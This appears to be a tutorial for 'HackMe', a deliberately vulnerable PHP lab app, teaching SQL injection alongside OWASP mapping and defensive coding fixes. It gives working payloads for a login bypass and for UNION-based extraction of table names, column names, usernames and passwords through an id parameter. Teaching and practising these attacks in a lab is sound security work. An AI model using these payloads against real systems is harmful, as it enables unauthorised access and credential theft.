# 🔓 HackMe – SQL Injection (SQLi) Tutorial

> ⚠️ This project is intentionally vulnerable and created for educational purposes only.
> Do not deploy in production or expose to the public internet.

---

# 1️⃣ SQL Injection to Bypass Insecure Login Form

## 🎯 Objective

Learn how SQL Injection works to bypass an insecure login system.

---

## 🧪 Step-by-Step Exploitation

### Step 1: Locate the Login Form

Open the HackMe website and navigate to the login page.

*(Insert screenshot here)*

---

### Step 2: Use SQL Injection Payload

Enter the following payload in **both username and password fields**:

```
a' OR 'a'='a
```

Click **Login**.

If the application is vulnerable, login will succeed without valid credentials.

---

## 🧠 Explanation

Most insecure login systems build SQL queries like this:

```sql
SELECT * FROM users 
WHERE username = '$username' 
AND password = '$password';
```

When we input:

```
a' OR 'a'='a
```

The query becomes:

```sql
SELECT * FROM users 
WHERE username = 'a' OR 'a'='a'
AND password = 'a' OR 'a'='a';
```

Since `'a'='a'` is always TRUE, the database returns at least one row.
The application assumes login is successful.

### 🔴 Why This Works

* User input is directly inserted into the SQL query
* No input validation
* No prepared statements
* No parameterized queries

### ✅ How To Fix

Use prepared statements:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

---

# 2️⃣ SQL Injection via GET Parameter

## 🎯 Objective

Exploit SQL Injection through a vulnerable URL parameter.

---

## 🧪 Step-by-Step Exploitation

### Step 1: Create a Post

After logging in, create a new post.

*(Insert screenshot here)*

After creation, click “Show This Only” to view the post.

You should see a URL like:

```
http://localhost/HackMe/?id=1
```

---

## 🧠 Understanding the URL Structure

Using this example:

```
http://localhost/HackMe/?id=1
```

* `http://` → Protocol
* `localhost` → Domain / Host
* `/HackMe/` → Directory / Application path
* `?` → Start of query string
* `id=1` → GET parameter

  * `id` = parameter name
  * `1` = parameter value

The application likely runs a query like:

```sql
SELECT * FROM posts WHERE id = 1;
```

---

## Step 2: Test for SQL Injection

Add a single quote `'` to the URL:

```
?id=1'
```

If the site shows a SQL error, that is the first sign of vulnerability.

### 🔎 Why?

The query becomes:

```sql
SELECT * FROM posts WHERE id = 1';
```

The extra `'` breaks the SQL syntax.

---

## Step 3: Using `--+` Comment

Now try:

```
?id=1'--+
```

### 🧠 Why `--+`?

* `--` starts a SQL comment in MySQL.
* Everything after `--` is ignored.
* `+` represents a space in URL encoding.

So the query becomes:

```sql
SELECT * FROM posts WHERE id = 1'-- ';
```

The database ignores the rest of the query after the comment.

This allows us to control the query safely.

---

# 3️⃣ Enumerating Number of Columns

We need to know how many columns exist in the original query.

Use:

```
?id=1'+order+by+1--+
?id=1'+order+by+2--+
?id=1'+order+by+3--+
...
```

Keep increasing the number.

If `ORDER BY 6` causes an error, but `ORDER BY 5` works, then:

👉 The query has **5 columns**.

---

# 4️⃣ Identifying Visible Columns (UNION Attack)

Now test:

```
?id=-1'+union+all+select+1,2,3,4,5--+
```

### 🧠 Why `id=-1`?

`-1` likely does not exist in the database.
This ensures no real data is returned.

So the application displays the result of our `UNION SELECT` instead.

### 🧠 Why `UNION ALL SELECT`?

`UNION` combines results of two queries.

We match the exact number of columns (5).
The numbers `1,2,3,4,5` help us identify which columns are visible on the webpage.

Wherever we see numbers displayed, those are injectable columns.

---

# 5️⃣ Extracting Database Information

Now we know column positions (example: 2,3,4 are visible).

## Get Database Name & DB User

```
?id=-1'+union+all+select+1,database(),user(),4,5--+
```

* `database()` → returns current database name
* `user()` → returns DB user

---

# 6️⃣ Extract Table Names

```
?id=-1'+union+all+select+1,group_concat(table_name),3,4,5+from+information_schema.tables+where+table_schema=database()--+
```

### 🧠 Explanation

* `information_schema` → system database
* `tables` → stores table metadata
* `group_concat()` → combines results into one row

This returns all table names in the current database.

---

# 7️⃣ Extract Column Names

```
?id=-1'+union+all+select+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_schema=database()+and+table_name='users'--+
```

This lists all column names from the `users` table.

---

# 8️⃣ Extracting Data from Table

```
?id=-1'+union+all+select+1,group_concat(username),group_concat(password),4,5+from+users--+
```

This displays:

* Column 2 → all usernames
* Column 3 → all passwords

---

# 🔐 About Password Hashing (Real-World Scenario)

In HackMe, passwords are stored in **plain text** for learning purposes.

In real-world applications:

Passwords are stored as **hashed values**, such as:

* MD5 (weak, outdated)
* SHA1 (weak)
* bcrypt (recommended)
* Argon2 (modern & secure)

Example of hashed password:

```
$2y$10$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36...
```

Even if attackers extract hashed passwords, they must:

* Perform dictionary attacks
* Use brute force
* Use rainbow tables

Modern systems should always:

* Use bcrypt or Argon2
* Use password salting
* Never store plain-text passwords

---

# 🛡 How To Secure Against SQL Injection

1. Use prepared statements
2. Validate input
3. Escape output
4. Use least privilege DB user
5. Disable detailed SQL error messages
6. Use Web Application Firewall (WAF)

---

# 🎓 Learning Outcome

After completing this lab, learners should understand:

* How SQL Injection works
* How attackers enumerate databases
* How UNION-based injection works
* Why secure coding is critical
* How to properly defend against SQL Injection

---

# 🏆 OWASP Top 10 Mapping

HackMe demonstrates vulnerabilities aligned with the **OWASP Top 10 (2021)** security risks.

This helps learners understand how real-world security standards classify these issues.

---

## 🔴 A03:2021 – Injection

**Demonstrated in:**

* Login bypass via SQL Injection
* GET parameter SQL Injection
* UNION-based SQL Injection

**Why it matches:**
User input is directly concatenated into SQL queries without validation or parameterization.

**Impact:**

* Authentication bypass
* Data extraction
* Database enumeration
* Full data compromise

---

## 🔴 A01:2021 – Broken Access Control

**Demonstrated in:**

* Accessing records directly via `?id=`
* Lack of authorization checks

**Why it matches:**
The application does not verify whether a logged-in user is authorized to view specific records.

**Impact:**

* Unauthorized data access
* Privilege escalation

---

## 🔴 A02:2021 – Cryptographic Failures

**Demonstrated in:**

* Passwords stored in plain text

**Why it matches:**
Sensitive data (passwords) are not encrypted or hashed securely.

**Impact:**

* Credential compromise
* Account takeover
* Credential reuse attacks

---

## 🔴 A05:2021 – Security Misconfiguration

**Demonstrated in:**

* SQL error messages displayed to users
* Debug information exposed

**Why it matches:**
Application exposes database errors, revealing internal structure.

**Impact:**

* Easier exploitation
* Information disclosure

---

## 🔴 A07:2021 – Identification and Authentication Failures

**Demonstrated in:**

* Login bypass via SQL Injection
* No proper session management

**Why it matches:**
Authentication logic can be bypassed due to insecure coding practices.

**Impact:**

* Full system compromise

---

# 🛡 Defensive Coding Guide (How To Secure HackMe)

This section explains how to convert HackMe into a secure application.

---

## 1️⃣ Use Prepared Statements (Prevent SQL Injection)

❌ Vulnerable code:

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

✅ Secure code (PDO):

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute([
    ':username' => $username,
    ':password' => $password
]);
```

Why this works:

* Input is treated as data
* SQL structure cannot be modified
* Injection payloads become harmless strings

---

## 2️⃣ Hash Passwords Properly

❌ Insecure:

```php
$password = $_POST['password'];
```

✅ Secure (bcrypt):

```php
$hashedPassword = password_hash($_POST['password'], PASSWORD_BCRYPT);
```

During login:

```php
if (password_verify($inputPassword, $storedHash)) {
    // Login success
}
```

### Why bcrypt?

* Automatically salted
* Resistant to brute force
* Adjustable cost factor

---

## 3️⃣ Hide SQL Errors

❌ Insecure:

```php
mysqli_query($conn, $query) or die(mysqli_error($conn));
```

✅ Secure:

```php
mysqli_query($conn, $query);
```

And in `php.ini`:

```
display_errors = Off
log_errors = On
```

Never expose internal errors to users.

---

## 4️⃣ Validate and Sanitize Input

Even with prepared statements, validation is important.

Example:

```php
$id = intval($_GET['id']);
```

Or strict validation:

```php
if (!filter_var($_GET['id'], FILTER_VALIDATE_INT)) {
    die("Invalid ID");
}
```

---

## 5️⃣ Principle of Least Privilege (Database)

Instead of using:

```
root@localhost
```

Create limited user:

```sql
CREATE USER 'hackme_user'@'localhost' IDENTIFIED BY 'StrongPassword';
GRANT SELECT, INSERT, UPDATE ON hackme.* TO 'hackme_user'@'localhost';
```

Never use root in production.
